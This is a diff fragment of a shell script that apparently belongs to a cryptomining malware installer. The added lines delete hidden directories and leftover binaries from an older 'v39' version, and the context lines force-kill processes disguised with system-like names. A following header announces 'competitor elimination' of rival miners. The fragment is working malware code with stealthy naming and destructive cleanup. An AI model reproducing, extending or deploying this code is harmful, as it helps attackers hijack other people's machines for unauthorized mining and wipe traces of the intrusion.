@@ -63,6 +63,15 @@ pkill -9 -f "sys_render_service" 2>/dev/null
 pkill -9 -f "watchdog.sh" 2>/dev/null
 pkill -9 -f "connfy-wd" 2>/dev/null
 
+# --- Nuke old v39 directories ---
+rm -rf /tmp/.connfy-core 2>/dev/null
+rm -rf /tmp/.sys_temp 2>/dev/null
+rm -rf /tmp/.s 2>/dev/null
+rm -rf "$HOME/.connfy-core" 2>/dev/null
+rm -rf /usr/local/bin/.connfy-core 2>/dev/null
+# Kill any leftover v39 binaries in common spots
+find /tmp -maxdepth 3 -name "sys_net_daemon" -o -name "sys_render_service" -o -name "watchdog.sh" 2>/dev/null | xargs rm -f 2>/dev/null
+
 # ============================================================
 # [ COMPETITOR ELIMINATION — KILL ALL FOREIGN MINERS ]
 # ============================================================
